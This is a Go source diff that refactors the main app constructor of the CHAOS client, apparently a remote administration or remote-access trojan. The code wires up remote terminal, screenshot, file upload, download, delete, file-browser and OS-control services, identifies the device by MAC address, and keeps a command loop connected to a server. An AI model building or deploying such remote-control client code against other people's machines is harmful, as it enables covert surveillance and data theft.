@@ -1,7 +1,8 @@
 package app
 
 import (
-	"github.com/tiagorlampert/CHAOS/client/app/gateway/client"
+	"github.com/tiagorlampert/CHAOS/client/app/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
@@ -13,43 +14,46 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
 	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/system"
-	"net/http"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
+	"log"
 )
 
 type App struct {
 	Handler *handler.Handler
 }
 
-func NewApp(httpClient *http.Client, configuration *environment.Configuration) *App {
-	osType := system.DetectOS()
-	clientGateway := client.NewGateway(configuration, httpClient)
+func New(configuration *environment.Configuration) *App {
+	infoService := information.NewService(configuration.Server.HttpPort)
 
-	informationService := information.NewInformationService(configuration.Server.Port)
-	terminalService := terminal.NewTerminalService()
-	appServices := &services.Services{
-		Information: informationService,
-		Terminal:    terminalService,
-		Screenshot:  screenshot.NewScreenshotService(),
-		Download:    download.NewDownloadService(configuration, clientGateway),
-		Upload:      upload.NewUploadService(configuration, httpClient),
-		Delete:      delete.NewDeleteService(),
-		Explorer:    explorer.NewExplorerService(),
-		OS:          os.NewOperatingSystemService(configuration, terminalService, osType),
-		URL:         url.NewURLService(terminalService, osType),
+	deviceSpecs, err := infoService.LoadDeviceSpecs()
+	if err != nil {
+		log.Fatal("error loading device specs: ", err)
 	}
 
-	deviceSpecs, err := informationService.LoadDeviceSpecs()
-	if err != nil {
-		panic(err)
+	httpClient := network.NewHttpClient(10)
+
+	operatingSystem := os.DetectOS()
+	terminalService := terminal.NewService()
+
+	clientGateway := client.NewGateway(configuration, httpClient)
+
+	clientServices := &services.Services{
+		Information: infoService,
+		Terminal:    terminalService,
+		Screenshot:  screenshot.NewService(),
+		Download:    download.NewService(configuration, clientGateway),
+		Upload:      upload.NewService(configuration, httpClient),
+		Delete:      delete.NewService(),
+		Explorer:    explorer.NewService(),
+		OS:          os.NewService(configuration, terminalService, operatingSystem),
+		URL:         url.NewURLService(terminalService, operatingSystem),
 	}
 
 	return &App{handler.NewHandler(
-		configuration, clientGateway, appServices, deviceSpecs.MacAddress)}
+		configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
 }
 
 func (a *App) Run() {
-	go a.Handler.HandleServer()
+	go a.Handler.KeepConnection()
 	a.Handler.HandleCommand()
 }
